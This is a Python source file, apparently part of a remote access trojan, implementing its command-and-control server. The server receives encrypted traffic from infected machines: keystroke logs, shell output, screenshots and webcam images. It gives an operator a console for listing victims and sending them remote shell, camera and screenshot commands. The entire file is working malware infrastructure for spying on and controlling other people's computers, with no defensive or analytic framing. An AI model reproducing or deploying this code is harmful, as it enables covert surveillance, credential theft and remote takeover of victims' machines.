# rat/server.py — C2 interactif
# python 3.11+ | pip install pycryptodome
import asyncio, json, base64, os
from rat.config import KEY, PORT
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

def encrypt(data: bytes) -> bytes:
    iv = os.urandom(16)
    c  = AES.new(KEY, AES.MODE_CBC, iv)
    return base64.b64encode(iv + c.encrypt(pad(data, 16)))

def decrypt(data: bytes) -> bytes:
    raw = base64.b64decode(data)
    iv, ct = raw[:16], raw[16:]
    c = AES.new(KEY, AES.MODE_CBC, iv)
    return unpad(c.decrypt(ct), 16)

clients: dict[str, asyncio.StreamWriter] = {}

async def handle(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    addr = writer.get_extra_info('peername')
    cid  = f"{addr[0]}:{addr[1]}"
    clients[cid] = writer
    print(f"\n[+] shell: {cid}")
    try:
        while True:
            n    = int.from_bytes(await reader.readexactly(4), 'big')
            msg  = json.loads(decrypt(await reader.readexactly(n)))
            typ  = msg.get("type")
            if typ == "keylog":
                print(f"[KEY {cid}] {msg['data']}")
            elif typ == "shell_out":
                print(f"[SH  {cid}]\n{msg['data']}")
            elif typ == "screenshot":
                fname = f"screen_{cid.replace(':','_')}.png"
                open(fname,'wb').write(base64.b64decode(msg['data']))
                print(f"[SCR] → {fname}")
            elif typ == "cam":
                fname = f"cam_{cid.replace(':','_')}.jpg"
                open(fname,'wb').write(base64.b64decode(msg['data']))
                print(f"[CAM] → {fname}")
    except Exception:
        print(f"[-] lost: {cid}")
        clients.pop(cid, None)

async def send_cmd(cid: str, cmd: dict):
    w = clients.get(cid)
    if not w:
        print("not found"); return
    data = encrypt(json.dumps(cmd).encode())
    w.write(len(data).to_bytes(4,'big') + data)
    await w.drain()

async def console():
    await asyncio.sleep(0.5)
    print("commands: list | shell <id> <cmd> | cam <id> | screen <id> | exit")
    loop = asyncio.get_event_loop()
    while True:
        line = (await loop.run_in_executor(None, input, "rat> ")).strip()
        if not line: continue
        p = line.split(None, 2)
        match p[0]:
            case "list":   print(list(clients.keys()))
            case "exit":   raise SystemExit
            case "shell"  if len(p)==3: await send_cmd(p[1], {"type":"shell","cmd":p[2]})
            case "cam"    if len(p)==2: await send_cmd(p[1], {"type":"cam"})
            case "screen" if len(p)==2: await send_cmd(p[1], {"type":"screenshot"})
            case _: print("?")

async def _main():
    srv = await asyncio.start_server(handle, '0.0.0.0', PORT)
    print(f"[*] C2 on :{PORT}")
    await asyncio.gather(srv.serve_forever(), console())

def run():
    asyncio.run(_main())